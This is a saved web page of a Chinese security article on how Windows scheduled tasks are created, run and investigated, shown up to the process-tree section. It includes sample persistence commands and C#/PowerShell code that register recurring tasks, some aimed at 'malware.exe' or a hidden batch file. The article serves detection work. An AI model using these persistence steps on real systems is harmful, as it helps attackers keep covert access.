@@ -1,0 +1,1274 @@
+<!DOCTYPE html>
+<!-- saved from url=(0030)https://paper.seebug.org/1464/ -->
+<html xmlns:wb="http://open.weibo.com/wb"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta property="wb:webmaster" content="ccd3e79934f3322d">
+  <title>windows 计划任务隐藏新姿势分享</title>
+  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术">
+  <meta name="description" content="">
+
+  <meta name="HandheldFriendly" content="True">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="shortcut icon" href="https://paper.seebug.org/static/images/favicon.ico">
+  <link rel="stylesheet" type="text/css" href="./windows 计划任务隐藏新姿势分享_files/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="./windows 计划任务隐藏新姿势分享_files/screen.css">
+  <link rel="stylesheet" type="text/css" href="./windows 计划任务隐藏新姿势分享_files/font.css">
+  <link rel="stylesheet" type="text/css" href="./windows 计划任务隐藏新姿势分享_files/plugin_comment.css">
+  <link rel="stylesheet" href="./windows 计划任务隐藏新姿势分享_files/font-awesome.min.css">
+  <link rel="stylesheet" type="text/css" href="./windows 计划任务隐藏新姿势分享_files/prism.css">
+  <link rel="stylesheet" type="text/css" href="./windows 计划任务隐藏新姿势分享_files/monokai.css" media="screen">
+  <link rel="stylesheet" type="text/css" href="./windows 计划任务隐藏新姿势分享_files/custom.css">
+  <link rel="stylesheet" type="text/css" href="./windows 计划任务隐藏新姿势分享_files/print.css" media="print">
+<script type="text/javascript" src="./windows 计划任务隐藏新姿势分享_files/jquery.min.js.下载"></script>
+<style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>
+
+<body class="home-template">
+<div class="weixin-share-img" style="display: none">
+  <img src="./windows 计划任务隐藏新姿势分享_files/weixin-share.png" alt="Paper">
+</div>
+
+<div id="wrapper" class="">
+
+<div id="sidebar">
+  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
+    <span class="hamb-top"></span>
+    <span class="hamb-middle"></span>
+    <span class="hamb-bottom"></span>
+  </button>
+  <div id="sidebar-content" class="inner">
+    <h2 class="blog-title">
+        <img src="./windows 计划任务隐藏新姿势分享_files/seebug-logo2.png" alt="Seebug-logo">
+    </h2>
+    <h3 class="blog-description">Paper - 安全技术精粹</h3>
+
+    <form id="search" action="https://paper.seebug.org/">
+      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
+        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;"> </i>
+      </button>
+      <input id="search-field" name="keyword" value="" placeholder="Search">
+
+    </form>
+    <div class="overlay"></div>
+    <div id="sidebar-links">
+      <ul id="subscription-links">
+        <li><a target="_blank" href="https://paper.seebug.org/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
+        </li>
+        <li><a href="https://paper.seebug.org/contribution/paper/"><i class="fa fa-envelope-o"></i>投稿</a></li>
+          <li><a href="https://paper.seebug.org/rank/"><i class="glyphicon glyphicon-signal"></i>阅读榜</a></li>
+      </ul>
+      <ul id="navigation">
+        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/"><i class="fa fa-angle-right"></i>首页</a></li>
+        
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/vul-analysis/"><i class="fa fa-angle-right"></i>漏洞分析</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/tools/"><i class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/information/"><i class="fa fa-angle-right"></i>情报分析</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/experience/"><i class="fa fa-angle-right"></i>经验心得</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/web-security/"><i class="fa fa-angle-right"></i>Web安全</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/bin-security/"><i class="fa fa-angle-right"></i>二进制安全</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/mobile-security/"><i class="fa fa-angle-right"></i>移动安全</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/prime/"><i class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/ctf/"><i class="fa fa-angle-right"></i>CTF</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/IoT/"><i class="fa fa-angle-right"></i>IoT安全</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/blockchain/"><i class="fa fa-angle-right"></i>区块链</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/404team/"><i class="fa fa-angle-right"></i>404专栏</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/report/"><i class="fa fa-angle-right"></i>专题报告</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/404team-en/"><i class="fa fa-angle-right"></i>404 English Paper</a></li>
+
+  <li class="nav-" role="presentation"><a href="https://paper.seebug.org/category/threat-intelligence/"><i class="fa fa-angle-right"></i>威胁情报</a></li>
+
+
+        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/call-for-paper/"><i class="fa fa-angle-right"></i>如何投稿</a></li>
+        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i class="fa fa-angle-right"></i>归档文件</a></li>
+      </ul>
+      <ul id="sidebar-external">
+      </ul>
+    </div>
+
+    <footer class="site-footer">
+      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
+    </footer>
+  </div>
+</div>
+
+<main>
+  <div class="main-inner">
+    <section id="results"></section>
+    
+<article class="">
+    <header class="post-header">
+
+        <h1 class="post-title" id="1627">windows 计划任务隐藏新姿势分享</h1>
+
+        <span class="post-print">
+        <a href="javascript:window.print()">
+        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
+        </a>
+      </span>
+        <section class="post-meta">
+        <span class="post-time">
+          <i class="fa fa-calendar"></i>
+          <time datetime="2021-01-21" class="timeago">2021年01月21日</time>
+          <time datetime="2021-01-21" class="fulldate">2021年01月21日</time>
+        </span>
+            
+            <br>
+            <i class="fa fa-tag"></i>
+            
+            <a href="https://paper.seebug.org/category/experience/">经验心得</a>
+            
+            
+            
+
+            <!--                -->
+            <!--                -->
+            <!--                -->
+            <!--                -->
+            <!--                -->
+            <!--                -->
+
+        </section>
+    </header>
+    <div class="x_panel" id="md-catalog">
+        <div class="x_title">
+            <h2>目录</h2>
+            <ul class="nav navbar-right panel_toolbox">
+                <li><a class="collapse-link">
+                    <i class="fa fa-chevron-up"></i>
+                </a></li>
+                <li><a class="close-link">
+                    <i class="fa fa-times"></i>
+                </a></li>
+            </ul>
+            <div class="clearfix"></div>
+        </div>
+        <div class="toc">
+<ul>
+<li><a href="https://paper.seebug.org/1464/#_1">计划任务的创建方式</a><ul>
+<li><a href="https://paper.seebug.org/1464/#_2">命令行创建计划任务</a><ul>
+<li><a href="https://paper.seebug.org/1464/#atexe">at.exe</a></li>
+<li><a href="https://paper.seebug.org/1464/#schtasksexe">schtasks.exe</a></li>
+</ul>
+</li>
+<li><a href="https://paper.seebug.org/1464/#_3">图形界面创建计划任务</a></li>
+<li><a href="https://paper.seebug.org/1464/#_4">代码创建计划任务</a><ul>
+<li><a href="https://paper.seebug.org/1464/#csharp">csharp</a></li>
+<li><a href="https://paper.seebug.org/1464/#powershell">powershell</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://paper.seebug.org/1464/#_5">深入理解计划任务</a><ul>
+<li><a href="https://paper.seebug.org/1464/#_6">计划任务的父进程</a><ul>
+<li><a href="https://paper.seebug.org/1464/#taskengexe">taskeng.exe</a></li>
+<li><a href="https://paper.seebug.org/1464/#svchostexe">svchost.exe</a></li>
+<li><a href="https://paper.seebug.org/1464/#taskhostwexe">taskhostw.exe</a></li>
+</ul>
+</li>
+<li><a href="https://paper.seebug.org/1464/#_7">计划任务相关注册表项</a></li>
+<li><a href="https://paper.seebug.org/1464/#sd">计划任务的安全描述符（SD）</a></li>
+</ul>
+</li>
+<li><a href="https://paper.seebug.org/1464/#_8">计划任务隐藏新姿势</a><ul>
+<li><a href="https://paper.seebug.org/1464/#_9">非完全隐藏</a><ul>
+<li><a href="https://paper.seebug.org/1464/#_10">测试用例</a></li>
+<li><a href="https://paper.seebug.org/1464/#_11">原理探究</a></li>
+</ul>
+</li>
+<li><a href="https://paper.seebug.org/1464/#_12">完全隐藏</a><ul>
+<li><a href="https://paper.seebug.org/1464/#_13">测试用例</a></li>
+<li><a href="https://paper.seebug.org/1464/#_14">原理探究</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://paper.seebug.org/1464/#_15">缓解计划任务的恶意利用</a></li>
+<li><a href="https://paper.seebug.org/1464/#_16">参考</a></li>
+</ul>
+</div>
+
+    </div>
+    <section class="post-content">
+        <p><strong>作者：REInject@73lab@青藤实验室</strong><br>
+<strong>原文链接：<a href="https://mp.weixin.qq.com/s/ktGug1VbSpmzh9CEGKbbdw">https://mp.weixin.qq.com/s/ktGug1VbSpmzh9CEGKbbdw</a></strong></p>
+<p>恶意软件或攻击者通常使用计划任务作为他们的持久化机制。从风险发现的角度考虑，理解计划任务的运行和创建方式以及和计划任务相关联的进程是有必要的。此外，本文还分享了一种<strong>未公开</strong>的计划任务隐藏方式。</p>
+<p>现在，让我们开始了解计划任务的一切。</p>
+<h2 id="_1">计划任务的创建方式</h2>
+<p>MSDN 里对计划任务的细节信息描述得很详细了，包括使用的API或工作机制。所以不再重复阐述，只引用一些必要的东西：
+<img alt="-w626" src="./windows 计划任务隐藏新姿势分享_files/1611218214000-16110429829692.jpg-w331s"></p>
+<p>计划任务调度器会根据任务的定义在指定的时间触发任务，它包含以下组件：
+<img alt="" src="./windows 计划任务隐藏新姿势分享_files/1611218215000-2kvhoe.png-w331s"></p>
+<ul>
+<li>Triggers：任务触发的条件</li>
+<li>Actions：任务运行的时候执行的动作</li>
+<li>Principals：指定运行任务的用户或用户组信息</li>
+<li>Settings：指定影响任务行为的其他设置</li>
+<li>Registration Information：包含任务创建时间、创建人等信息</li>
+<li>Data：执行任务时使用的额外的信息</li>
+</ul>
+<p>更多信息可以在 <a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page">MSDN</a> 找到。</p>
+<h3 id="_2">命令行创建计划任务</h3>
+<p>命令行创建计划任务包括 at.exe 和 schtasks.exe。</p>
+<h4 id="atexe">at.exe</h4>
+<p>使用 at 命令创建计划任务的方式：</p>
+<pre class="codehilite"><code class="language-cmd">at 11:11 /every:Sunday,Monday,Tuesday "malware.exe"</code></pre>
+
+
+<p>以上命令将创建一个计划任务，在每周日、周一、周二的 11:11 执行 malware.exe。</p>
+<p>也可以通过 <code>\\ComputerName</code> 在指定计算机上运行，更多的参数信息参考 <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490866%28v=technet.10%29">MSDN</a>。</p>
+<p>下面这些信息可能会帮助排查 at.exe 生成的计划任务：</p>
+<ul>
+<li>路径： <code>%SystemRoot%\System32\at.exe</code></li>
+<li>权限： 必须是管理员组用户</li>
+<li>排查： 检查创建任务时的命令行内容，看看可执行程序或者命令是否是恶意的</li>
+<li>其他：</li>
+<li>at 创建的任务文件位置：<code>%SystemRoot%\Tasks</code>，关注 At[x].job 文件，x 代表任务的 ID</li>
+<li>和任务相关的 XML 文件位置：<code>%SystemRoot%\System32\Tasks</code></li>
+<li>如果任务日志是启用的，可以排查 <code>应用程序和服务日志/Microsoft/Windows/TaskScheduler/Operational</code> 事件日志</li>
+</ul>
+<h4 id="schtasksexe">schtasks.exe</h4>
+<p>at.exe 在 windows8 开始就<strong>弃用</strong>了，之后的系统都是使用 schtasks.exe 创建计划任务，该命令参数信息如下：</p>
+<pre class="codehilite"><code class="language-cmd">SCHTASKS /Create [/S system [/U username [/P [password]]]]
+    [/RU username [/RP password]] /SC schedule [/MO modifier] [/D day]
+    [/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime]
+    [/RI interval] [ {/ET endtime | /DU duration} [/K] [/XML xmlfile] [/V1]]
+    [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F] [/HRESULT] [/?]</code></pre>
+
+
+<p>schtasks 比 at 更加强大，提供了很多自定义任务时需要的参数。在对计划任务排查时，我们可能更关注的是执行的任务内容，和它相关的参数是 <code>TR</code>。一般情况创建恶意计划任务的命令大概是这样子：</p>
+<pre class="codehilite"><code class="language-cmd">"c:\Windows\System32\schtasks.exe" /Create /SC ONCE /TN KglN9I99 /TR "cmd /c \"start /min C:\ProgramData\KglN9I99.bat\"" /ST 20:21</code></pre>
+
+
+<p>这个命令中使用了 <code>/TN</code> 指定任务名称为 KglN9I99，<code>/TR</code> 参数指定运行的恶意命令，<code>/ST</code> 指定了运行时间，<code>/SC</code> 指定运行周期，还可以通过 <code>/ED</code> 参数指定任务终止日期等。</p>
+<p>更多关于 schtasks.exe 的用法，参考 <a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks">MSDN</a></p>
+<p>下面这些信息可能会帮助排查 schtasks.exe 生成的计划任务：</p>
+<ul>
+<li>路径： <code>%SystemRoot%\System32\schtasks.exe</code></li>
+<li>权限： 普通用户。如果要显式指定高权用户运行任务，需要该账户的账户名和密码信息。</li>
+<li>排查：</li>
+<li>检查调用 schtasks 的父进程信息，是否有权创建任务</li>
+<li>检查 <code>/TR</code> 参数的值，可执行文件或命令是否是恶意的</li>
+<li>其他：</li>
+<li>和任务相关的 XML 文件位置：<code>%SystemRoot%\System32\Tasks</code></li>
+<li>如果任务日志是启用的，可以排查 <code>应用程序和服务日志/Microsoft/Windows/TaskScheduler/Operational</code> 事件日志</li>
+</ul>
+<p>一旦任务创建，将会自动在目录 <code>%SystemRoot%\System32\Tasks</code> 生成一个关于该任务的描述性 XML 文件，包含了所有的任务信息。</p>
+<h3 id="_3">图形界面创建计划任务</h3>
+<p>win+r 启动 taskschd.msc</p>
+<p><img alt="cXlyxA" src="./windows 计划任务隐藏新姿势分享_files/1611218216000-3cyqww.png-w331s"></p>
+<p>mmc 程序启动后会直接提权到管理员权限，所以普通用户可以创建高权限的任务：</p>
+<p><img alt="KiORcr" src="./windows 计划任务隐藏新姿势分享_files/1611218217000-4ddlsz.png-w331s"></p>
+<p>选中 Task Scheduler Library ，右键 Create Task...，在弹出界面，逐个配置即可:</p>
+<p><img alt="TLNvYf" src="./windows 计划任务隐藏新姿势分享_files/1611218217000-5mfyda.png-w331s"></p>
+<p>需要注意的是，通过 <code>taskschd.msc</code> 创建的任务会直接从托管 <strong>Task Scheduler</strong> 服务的 svchost.exe 进程派生。</p>
+<h3 id="_4">代码创建计划任务</h3>
+<p>代码最终都是和 <code>c:\windows\system32\taskschd.dll</code> 提供的 COM 服务交互，它的 GUID 是 <code>0F87369F-A4E5-4CFC-BD3E-73E6154572DD</code>。</p>
+<p>注册表路径: </p>
+<pre class="codehilite"><code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}</code></pre>
+
+
+<p><img alt="nkLjle" src="./windows 计划任务隐藏新姿势分享_files/1611218218000-6azslm.png-w331s"></p>
+<p>该 COM 组件不支持 Elevation，无法自动提权。</p>
+<p>下面是2种创建计划任务的代码示例。</p>
+<h4 id="csharp">csharp</h4>
+<p>c# 实现的话，为了方便，引用 <a href="https://github.com/dahall/TaskScheduler">TaskScheduler</a> 项目进行计划任务的创建：</p>
+<pre class="codehilite language-csharp"><code class=" language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span>
+<span class="token keyword">using</span> System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>Principal<span class="token punctuation">;</span>
+<span class="token keyword">using</span> System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>AccessControl<span class="token punctuation">;</span>
+<span class="token keyword">using</span> Microsoft<span class="token punctuation">.</span>Win32<span class="token punctuation">.</span>TaskScheduler<span class="token punctuation">;</span>
+<span class="token keyword">using</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>RegularExpressions<span class="token punctuation">;</span>
+
+<span class="token keyword">namespace</span> SchtaskHidden
+<span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Program</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main<span class="token punctuation">(</span></span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+           <span class="token comment" spellcheck="true"> //TaskCollection tt = TaskService.Instance.RootFolder.GetTasks(new Regex("test"));
+</span>           <span class="token comment" spellcheck="true"> //foreach(Task ti in tt)
+</span>           <span class="token comment" spellcheck="true"> //{
+</span>           <span class="token comment" spellcheck="true"> //    Console.WriteLine(ti.Name);
+</span>           <span class="token comment" spellcheck="true"> //}
+</span>           <span class="token comment" spellcheck="true"> //System.Environment.Exit(0);
+</span>            TaskDefinition td <span class="token operator">=</span> TaskService<span class="token punctuation">.</span>Instance<span class="token punctuation">.</span><span class="token function">NewTask<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            td<span class="token punctuation">.</span>RegistrationInfo<span class="token punctuation">.</span>Description <span class="token operator">=</span> <span class="token string">"do something"</span><span class="token punctuation">;</span>
+           <span class="token comment" spellcheck="true"> //td.Principal.RunLevel = TaskRunLevel.Highest;
+</span>           <span class="token comment" spellcheck="true"> //td.Principal.LogonType = TaskLogonType.ServiceAccount;
+</span>           <span class="token comment" spellcheck="true"> //td.Principal.UserId = "SYSTEM";
+</span>
+            TimeTrigger dt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TimeTrigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            dt<span class="token punctuation">.</span>StartBoundary <span class="token operator">=</span> DateTime<span class="token punctuation">.</span>Now<span class="token punctuation">;</span>
+            dt<span class="token punctuation">.</span>Repetition<span class="token punctuation">.</span>Interval <span class="token operator">=</span> TimeSpan<span class="token punctuation">.</span><span class="token function">FromMinutes<span class="token punctuation">(</span></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            td<span class="token punctuation">.</span>Triggers<span class="token punctuation">.</span><span class="token function">Add<span class="token punctuation">(</span></span>dt<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            td<span class="token punctuation">.</span>Actions<span class="token punctuation">.</span><span class="token function">Add<span class="token punctuation">(</span></span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c \"calc.exe\""</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Task t <span class="token operator">=</span> TaskService<span class="token punctuation">.</span>Instance<span class="token punctuation">.</span>RootFolder<span class="token punctuation">.</span><span class="token function">RegisterTaskDefinition<span class="token punctuation">(</span></span>path<span class="token punctuation">:</span> <span class="token string">"testxxx"</span><span class="token punctuation">,</span> definition<span class="token punctuation">:</span> td<span class="token punctuation">,</span> TaskCreation<span class="token punctuation">.</span>CreateOrUpdate<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Console<span class="token punctuation">.</span><span class="token function">WriteLine<span class="token punctuation">(</span></span><span class="token string">"success!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token comment" spellcheck="true"> //TaskSecurity ts = new TaskSecurity(t);
+</span>           <span class="token comment" spellcheck="true"> //ts.RemoveAccessRuleAll(new TaskAccessRule(new SecurityIdentifier(WellKnownSidType.ServiceSid, null), TaskRights.Read | TaskRights.Write | TaskRights.ReadAttributes, AccessControlType.Allow));
+</span>
+           <span class="token comment" spellcheck="true"> //t.SetAccessControl(ts);
+</span>
+           <span class="token comment" spellcheck="true"> //Console.WriteLine("success!!");
+</span>        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+
+
+<h4 id="powershell">powershell</h4>
+<pre class="codehilite"><code class="language-powershell">$TaskDescr = "test task"
+$Author = "thin0"
+$TaskName = "test"
+$TaskStartTime = [datetime]::Now
+$TaskCommand = "cmd.exe"
+$TaskArg = "/c calc.exe"
+$UserAcct = "$env:userdomain\$env:username"
+# $UserAcct = "SYSTEM"
+
+$ScheduleObject = new-object -ComObject("Schedule.Service")
+# connect to the local machine. 
+$ScheduleObject.Connect("localhost")
+$rootFolder = $ScheduleObject.GetFolder("\")
+
+$TaskDefinition = $ScheduleObject.NewTask(0) 
+$TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
+$TaskDefinition.RegistrationInfo.Author = "$Author"
+#$TaskDefinition.Principal.RunLevel = 1
+$TaskDefinition.Settings.Enabled = $true
+$TaskDefinition.Settings.AllowDemandStart = $true
+$TaskDefinition.Settings.DisallowStartIfOnBatteries = $false
+$TaskDefinition.Settings.ExecutionTimeLimit = "PT0S"  # See Note Below
+
+$triggers = $TaskDefinition.Triggers
+$trigger = $triggers.Create(1) # Creates a "time-based" trigger, 8: system startup
+$trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
+$trigger.Repetition.Interval = 1
+$trigger.Enabled = $true
+
+$Action = $TaskDefinition.Actions.Create(0)
+$action.Path = "$TaskCommand"
+$action.Arguments = "$TaskArg"
+
+$rootFolder.RegisterTaskDefinition($TaskName,$TaskDefinition,6,$UserAcct,$null,3)</code></pre>
+
+
+<p>powershell 可以不用这么麻烦，有自带的 cmdlet：</p>
+<pre class="codehilite"><code class="language-powershell">$taskname = "test"
+$cmd = "cmd.exe"
+$cmdargs = "/c calc.exe"
+$username = "$env:username"
+#$username = "SYSTEM"
+$taskdescription = "test task"
+
+$action = New-ScheduledTaskAction -Execute $cmd -Argument $cmdargs
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -minutes 1)
+$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 0) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskname -Description $taskdescription -Settings $settings -User $username -RunLevel 1 # 1 for highest, 0 for low</code></pre>
+
+
+<p>删除命令：<code>Unregister-ScheduledTask -TaskName test -Confirm:$false</code></p>
+<h2 id="_5">深入理解计划任务</h2>
+<h3 id="_6">计划任务的父进程</h3>
+<p>运行计划任务的相关服务是：<strong>Task Scheduler</strong>。该服务使用 svchost.exe 的 netsvcs 组进行托管。</p>
+<p><img alt="" src="./windows 计划任务隐藏新姿势分享_files/1611218220000-7yhgui.png-w331s"></p>
+<p>通过进程树看到 svchost.exe 进程的命令行为</p>
+<pre class="codehilite"><code>svchost.exe -k netsvcs -p -s Schedule</code></pre>
+
+
+<p>在 Windows 10.1703以下可能看不到 <code>-s Schedule</code> 参数。</p>
+<h4 id="taskengexe">taskeng.exe</h4>
+<p>在旧系统中计划任务的进程派生顺序是这样子的：
+svchost.exe -&gt; taskeng.exe -&gt; [SpecialTaskProcess]</p>
+<p>例如：
+<img alt="" src="./windows 计划任务隐藏新姿势分享_files/1611218220000-8dqrdu.png-w331s"></p>
+<p>taskeng.exe 的进程参数语法如下：</p>
+<pre class="codehilite"><code class="language-cmd">taskeng.exe {GUID} [User SID]:[Domain]\[User Name]:[Options]</code></pre>
+
+
+<p>某些情况下，可能只有 {GUID} 一个参数，Options 参数可能会标识一些其他信息，例如权限信息，如果一个任务运行在高权限模式下，Options 的内容会是：<code>Interactive:Highest[1]</code></p>
+<p>所以在旧的系统中可以查看进程树排查恶意进程，例如找到 taskeng.exe 的进程树，它的父进程为<code>svchost.exe -k netsvcs</code>。
+子进程就是运行中的任务对应的进程，通过排查子进程确定恶意进程。</p>
+<h4 id="svchostexe">svchost.exe</h4>
+<p>win7之后，计划任务托管程序从 taskeng.exe 慢慢迁移到 svchost.exe，这期间计划任务进程派生可能有两种顺序：</p>
+<ul>
+<li>wininit.exe -&gt; services.exe -&gt; svchost.exe -&gt; [SpecialTaskProcess]</li>
+<li>wininit.exe -&gt; services.exe -&gt; svchost.exe -&gt; taskeng.exe -&gt; [SpecialTaskProcess]</li>
+</ul>
+<p>从 Windows 10.1511 版本开始，不再有 taskeng.exe 了，新版本系统中找不到该程序，任务进程直接运行在托管 Task Scheduler 服务的 svchost.exe 进程下：</p>
+<p><img alt="" src="./windows 计划任务隐藏新姿势分享_files/1611218221000-9vctkp.png-w331s"></p>
+<p>所以高版本系统中，我们可以通过</p>
+<pre class="codehilite"><code>svchost.exe -k netsvcs</code></pre>
+
+
+<p>排查进程的子进程来确定恶意或可疑程序。</p>
+<h4 id="taskhostwexe">taskhostw.exe</h4>
+<p>在上面的图里，可以很明显注意到</p>
+<pre class="codehilite"><code>svchost.exe -k netsvcs</code></pre>
+
+
+<p>下还有一个名为 taskhostw.exe 的进程。</p>
+<p>在 Windows 7 上该进程名为：taskhost.exe。</p>
+<p>在 Windows 8 上该进程名为：taskhostex.exe。</p>
+<p>该进程的作用同 dllhost.exe 和 svchost.exe 相似，起到一个 DLL 托管的作用。</p>
+<p>通过搜索 <code>%SystemRoot%\System32\Tasks</code> 文件夹，我们能发现一些任务对应的动作不是 Exec，而是 ComHandler。</p>
+<p>我们找到一些能起到对比效果的任务 XML，隐藏了一些不必要的字段。</p>
+<p>这是我们利用 schtasks.exe 命令创建的任务 XML：</p>
+<pre class="codehilite"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-16"?&gt;
+&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
+  &lt;Actions Context="Author"&gt;
+    &lt;Exec&gt;
+      &lt;Command&gt;"C:\Program Files (x86)\IObit\Advanced SystemCare\ASC.exe"&lt;/Command&gt;
+      &lt;Arguments&gt;/SkipUac&lt;/Arguments&gt;
+    &lt;/Exec&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;</code></pre>
+
+
+<p>这个是系统 .NET Framework 的计划任务 XML 内容，如果安装了 .NET 框架可以在 </p>
+<pre class="codehilite"><code>%SystemRoot%\System32\Tasks\Microsoft\Windows\.NET Framework </code></pre>
+
+
+<p>目录下找到：</p>
+<pre class="codehilite"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-16"?&gt;
+&lt;Task version="1.6" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
+  &lt;Actions Context="Author"&gt;
+    &lt;ComHandler&gt;
+      &lt;ClassId&gt;{84F0FAE1-C27B-4F6F-807B-28CF6F96287D}&lt;/ClassId&gt;
+      &lt;Data&gt;&lt;![CDATA[/RuntimeWide]]&gt;&lt;/Data&gt;
+    &lt;/ComHandler&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;</code></pre>
+
+
+<p>手动触发 .NET Framework  任务，该任务调用  ngentasklauncher.dll ，通过 ProcExp.exe 监控进程观察到的进程树：</p>
+<p><img alt="" src="./windows 计划任务隐藏新姿势分享_files/1611218221000-10hovgo.png-w331s"></p>
+<p>可以注意到 taskhostw.exe 的参数 <code>/RuntimeWide</code> 和 xml 中 <code>\&lt;Data\&gt;</code> 标签指定的一样。</p>
+<p>在观察 taskhostw.exe 进程树的过程中，发现下面的命令行参数：</p>
+<pre class="codehilite"><code class="language-cmd">taskhosw.exe Install $(Arg0)</code></pre>
+
+
+<p>这个东西在 <a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/task-actions">MSDN</a> 中做了介绍：
+<img alt="-w624" src="./windows 计划任务隐藏新姿势分享_files/1611218221000-16110512169918.jpg-w331s">
+由此可知，<code>$(Arg0)</code> 这个参数是在通过 <code>IRegisteredTask::Run[Ex]</code> 接口运行任务时动态指定的。在一些 Windows 默认的任务中常见：</p>
+<p>\Microsoft\Windows\Workplace Join\Automatic-Device-Join 任务：</p>
+<pre class="codehilite"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-16"?&gt;
+&lt;Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
+  &lt;Actions Context="LocalSystem"&gt;
+    &lt;Exec&gt;
+      &lt;Command&gt;%SystemRoot%\System32\dsregcmd.exe&lt;/Command&gt;
+      &lt;Arguments&gt;$(Arg0) $(Arg1) $(Arg2)&lt;/Arguments&gt;
+    &lt;/Exec&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;</code></pre>
+
+
+<p>\Microsoft\Windows\Maps\MapsToastTask 任务：</p>
+<pre class="codehilite"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-16"?&gt;
+&lt;Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
+  &lt;Actions Context="Users"&gt;
+    &lt;ComHandler&gt;
+      &lt;ClassId&gt;{9885AEF2-BD9F-41E0-B15E-B3141395E803}&lt;/ClassId&gt;
+      &lt;Data&gt;&lt;![CDATA[$(Arg0);$(Arg1);$(Arg2);$(Arg3);$(Arg4);$(Arg5);$(Arg6);$(Arg7)]]&gt;&lt;/Data&gt;
+    &lt;/ComHandler&gt;
+  &lt;/Actions&gt;
